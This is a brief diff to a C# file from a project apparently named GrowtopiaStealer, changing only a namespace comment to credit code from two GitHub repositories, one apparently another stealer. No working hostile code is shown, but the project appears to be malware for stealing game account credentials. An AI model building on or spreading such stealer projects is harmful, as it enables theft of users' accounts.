@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 
-namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
+namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer that code from https://github.com/Khainaaeh/44CALIBER/
 {
     class WinAPI
     {
